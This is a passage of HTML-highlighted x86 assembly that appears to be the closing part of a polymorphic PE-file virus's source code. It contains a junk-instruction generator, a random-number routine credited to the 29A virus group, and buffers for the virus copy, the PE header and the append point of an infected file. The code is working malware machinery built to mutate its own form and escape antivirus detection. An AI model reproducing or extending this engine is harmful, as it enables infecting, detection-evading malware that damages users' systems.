        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">gencmp1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">gencmpvalue</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;81f8</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">081f8h</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
        

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generate junk   f8 - fd</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genjunk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">genjunk</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">genjunk</span><span class="sc0">

        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">





</span><span class="sc5">getrndal</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">rdtcs</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">310Fh</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">get_rnd32</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;main part by GriYo / 29A</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">rdtcs</span><span class="sc0">                                   </span><span class="sc1">;just 4 some xtra randomness</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">polyend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c)"</span><span class="sc0">                           </span><span class="sc1">;just some junk</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">



</span><span class="sc5">pointertope</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">death</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;kill ourself flag</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">busy</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">peheader</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">whereappend</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pushtable</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">viruscopy</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">virusz</span><span class="sc4">+</span><span class="sc2">1000</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;virussize + poly</span><span class="sc0">

</span><span class="sc5">memend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">_CODE</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">fill</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_burp</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'LiFEwiRE'</span><span class="sc0">
</span><span class="sc5">fill2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_burp</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
